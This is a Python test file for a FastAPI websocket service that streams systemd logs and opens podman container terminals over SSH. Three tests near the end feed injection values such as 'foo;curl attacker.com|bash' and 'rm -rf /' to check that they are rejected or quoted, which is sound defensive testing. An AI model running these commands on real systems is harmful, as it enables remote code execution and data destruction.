import pytest
import asyncio
from unittest.mock import AsyncMock, MagicMock
from fastapi import WebSocket, WebSocketDisconnect
from api.sockets import ConnectionManager, stream_logs_over_websocket, exec_terminal_over_websocket
from services.ssh_manager import pool

@pytest.fixture
def mock_websocket():
    ws = AsyncMock(spec=WebSocket)
    return ws

@pytest.mark.asyncio
async def test_connection_manager(mock_websocket):
    cm = ConnectionManager()
    await cm.connect(mock_websocket)
    assert mock_websocket in cm.active_connections
    mock_websocket.accept.assert_called_once()
    
    await cm.broadcast("test msg")
    mock_websocket.send_text.assert_called_with("test msg")
    
    cm.disconnect(mock_websocket)
    assert mock_websocket not in cm.active_connections

@pytest.mark.asyncio
async def test_stream_logs_over_websocket_disconnect(mock_websocket, monkeypatch):
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.terminate = MagicMock()
    
    async def mock_stdout():
        yield "log line 1\n"
        yield "log line 2\n"

    mock_process.stdout = mock_stdout()
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn
    
    monkeypatch.setattr("api.sockets.pool", mock_pool)
    
    mock_websocket.receive_text.side_effect = WebSocketDisconnect()
    
    await stream_logs_over_websocket(mock_websocket, server_id=1, unit_name="my_unit.service")
    
    mock_pool.get_connection.assert_called_once_with(1)
    mock_conn.create_process.assert_called_once_with("journalctl --user -u my_unit.service -f -n 100")
    
    mock_process.terminate.assert_called_once()
    mock_process.wait.assert_awaited_once_with(check=False)

@pytest.mark.asyncio
async def test_stream_logs_over_websocket_stop_command(mock_websocket, monkeypatch):
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.terminate = MagicMock()

    async def empty_stdout():
        if False:
            yield ""

    mock_process.stdout = empty_stdout()
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn
    monkeypatch.setattr("api.sockets.pool", mock_pool)

    mock_websocket.receive_text.return_value = "STOP"

    await stream_logs_over_websocket(mock_websocket, server_id=1, unit_name="my_unit.service")

    mock_process.terminate.assert_called_once()
    mock_process.wait.assert_awaited_once_with(check=False)


@pytest.mark.asyncio
async def test_exec_terminal_over_websocket_disconnect(mock_websocket, monkeypatch):
    """Test that terminal process is properly cleaned up on WebSocket disconnect"""
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.kill = MagicMock()

    async def mock_stdout():
        yield "container output\n"
        # Simulate disconnect on next iteration
        raise WebSocketDisconnect()

    mock_process.stdout = mock_stdout()
    mock_process.stdin = MagicMock()
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn

    monkeypatch.setattr("api.sockets.pool", mock_pool)

    mock_websocket.receive_text.side_effect = WebSocketDisconnect()

    await exec_terminal_over_websocket(mock_websocket, server_id=1, container_name="myapp", scope="user", cmd="bash")

    mock_pool.get_connection.assert_called_once_with(1)
    mock_conn.create_process.assert_called_once()

    # Verify PTY was requested
    call_kwargs = mock_conn.create_process.call_args[1]
    assert call_kwargs.get('request_pty') is True
    assert call_kwargs.get('term_type') == 'xterm-256color'

    mock_process.kill.assert_called()
    mock_process.wait.assert_awaited()


@pytest.mark.asyncio
async def test_exec_terminal_forward_input(mock_websocket, monkeypatch):
    """Test that terminal input is forwarded to process stdin"""
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.kill = MagicMock()
    mock_stdin = MagicMock()
    mock_process.stdin = mock_stdin

    async def mock_stdout():
        yield "$ "
        # Simulate disconnect
        raise WebSocketDisconnect()

    mock_process.stdout = mock_stdout()
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn

    monkeypatch.setattr("api.sockets.pool", mock_pool)

    # Send input to terminal
    mock_websocket.receive_text.side_effect = ["ls\n", WebSocketDisconnect()]

    await exec_terminal_over_websocket(mock_websocket, server_id=1, container_name="myapp", scope="user", cmd="bash")

    # Verify input was written to stdin
    mock_stdin.write.assert_called_once()


@pytest.mark.asyncio
async def test_exec_terminal_resize_event(mock_websocket, monkeypatch):
    """Test that terminal resize events are handled"""
    import json

    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.kill = MagicMock()
    mock_process.set_terminal_size = MagicMock()
    mock_process.stdin = MagicMock()

    async def mock_stdout():
        yield "output"
        raise WebSocketDisconnect()

    mock_process.stdout = mock_stdout()
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn

    monkeypatch.setattr("api.sockets.pool", mock_pool)

    # Send resize event
    resize_event = json.dumps({"type": "resize", "cols": 120, "rows": 40})
    mock_websocket.receive_text.side_effect = [resize_event, WebSocketDisconnect()]

    await exec_terminal_over_websocket(mock_websocket, server_id=1, container_name="myapp", scope="user", cmd="bash")

    # Verify resize was called
    mock_process.set_terminal_size.assert_called_once_with(120, 40)


@pytest.mark.asyncio
async def test_exec_terminal_with_custom_command(mock_websocket, monkeypatch):
    """Test that custom commands are passed to podman exec"""
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.kill = MagicMock()
    mock_process.stdin = MagicMock()

    async def mock_stdout():
        raise WebSocketDisconnect()

    mock_process.stdout = mock_stdout()
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn

    monkeypatch.setattr("api.sockets.pool", mock_pool)

    mock_websocket.receive_text.side_effect = WebSocketDisconnect()

    await exec_terminal_over_websocket(mock_websocket, server_id=1, container_name="myapp", scope="user", cmd="python")

    # Verify correct command was executed
    call_args = mock_conn.create_process.call_args[0]
    assert "podman exec -it myapp python" in call_args[0]


@pytest.mark.asyncio
async def test_stream_logs_rejects_invalid_unit_name(mock_websocket, monkeypatch):
    """Test that injected chars in unit_name are rejected before process is started"""
    mock_pool = AsyncMock()
    monkeypatch.setattr("api.sockets.pool", mock_pool)

    await stream_logs_over_websocket(mock_websocket, server_id=1, unit_name="foo;curl attacker.com|bash")

    mock_pool.get_connection.assert_not_called()
    mock_websocket.send_text.assert_called_once()
    sent = mock_websocket.send_text.call_args[0][0]
    assert "invalid" in sent.lower() or "error" in sent.lower()


@pytest.mark.asyncio
async def test_exec_terminal_rejects_invalid_container_name(mock_websocket, monkeypatch):
    """Test that injected chars in container_name are rejected before process is started"""
    mock_pool = AsyncMock()
    monkeypatch.setattr("api.sockets.pool", mock_pool)

    await exec_terminal_over_websocket(mock_websocket, server_id=1, container_name="foo&&rm -rf /", scope="user", cmd="bash")

    mock_pool.get_connection.assert_not_called()
    mock_websocket.send_text.assert_called_once()
    sent = mock_websocket.send_text.call_args[0][0]
    assert "invalid" in sent.lower() or "error" in sent.lower()


@pytest.mark.asyncio
async def test_exec_terminal_cmd_injection_is_quoted(mock_websocket, monkeypatch):
    """Test that shell metacharacters in cmd are quoted, not interpreted"""
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.kill = MagicMock()
    mock_process.stdin = MagicMock()

    async def mock_stdout():
        raise WebSocketDisconnect()

    mock_process.stdout = mock_stdout()
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn
    monkeypatch.setattr("api.sockets.pool", mock_pool)

    mock_websocket.receive_text.side_effect = WebSocketDisconnect()

    await exec_terminal_over_websocket(
        mock_websocket, server_id=1, container_name="myapp", scope="user",
        cmd="bash;rm -rf /"
    )

    call_args = mock_conn.create_process.call_args[0]
    built_cmd = call_args[0]
    # Semicolon must be quoted — it must not appear as a bare shell separator
    assert "'bash;rm" in built_cmd or '"bash;rm' in built_cmd


@pytest.mark.asyncio
async def test_stream_logs_valid_unit_name_passes(mock_websocket, monkeypatch):
    """Test that valid systemd unit names (including template instances) still work"""
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.terminate = MagicMock()

    async def mock_stdout():
        if False:
            yield ""

    mock_process.stdout = mock_stdout()
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn
    monkeypatch.setattr("api.sockets.pool", mock_pool)

    mock_websocket.receive_text.return_value = "STOP"

    await stream_logs_over_websocket(mock_websocket, server_id=1, unit_name="myapp@1.service")

    mock_pool.get_connection.assert_called_once_with(1)
    mock_conn.create_process.assert_called_once()
